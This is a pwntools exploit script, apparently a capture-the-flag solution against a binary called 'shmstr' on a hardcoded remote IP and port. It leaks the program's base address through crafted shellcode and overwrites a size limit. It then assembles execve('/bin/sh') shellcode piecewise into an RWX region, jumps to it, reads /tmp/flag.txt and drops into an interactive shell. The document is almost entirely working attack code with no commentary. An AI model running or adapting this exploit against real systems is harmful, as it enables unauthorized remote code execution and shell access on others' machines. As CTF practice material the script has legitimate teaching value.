#!/usr/bin/env python3
from pwn import *

def add_sc(sc):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'shellcode: ', sc)

def view_sc(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx))

def delete_sc(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx))

def run_sc(idx, args):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx: ', str(idx))
    p.sendlineafter(b'argument: ', args)
    
# p = process('./shmstr')
p = remote('151.236.114.211', 17173)

# Leak text
sc = asm('''
    push ebx
    pop  eax
    push ebx
    pop  eax
    push ebx
    pop  eax
''')
add_sc(sc)
run_sc(0, b'1234')

p.recvuntil(b'return code = ')
text = int(p.recvuntil(b'\n', drop=True)) - 0x3f9c
log.info('text: ' + hex(text))
limit = text + 0x4010

# Overwrite limit
sc = asm('''
    pop  edx
    pop  eax
    push edx
    xor  DWORD PTR [eax], esi
''')
sc += b't' # je ...
delete_sc(0)
add_sc(sc)
run_sc(0, str(limit))

# Write shellcdoe to rwx region
real_sc = asm('''
    push 0x0068732f
    push 0x6e69622f
    mov eax, 0xb
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
''')

real_scs = []

for idx in range(0, len(real_sc), 4):
    real_scs.append(u32(real_sc[idx:idx+4].ljust(4, b'\0')))

for idx in range(len(real_scs)):
    sc = asm('''
        pop  edx
        pop  ecx
        push edx
        xor  DWORD PTR [eax+{}], ecx
    '''.format(0x41 + idx * 4))
    delete_sc(0)
    add_sc(sc)
    run_sc(0, str(real_scs[idx]))

# Return to rwx region
sc = asm('''
    xor al, 0x41
    pop ecx
    push eax
    pop ecx
    push eax
''')
delete_sc(0)
add_sc(sc)
run_sc(0, str(0x12345678))

# Pwned
p.sendline(b'cat /tmp/flag.txt')

p.interactive()
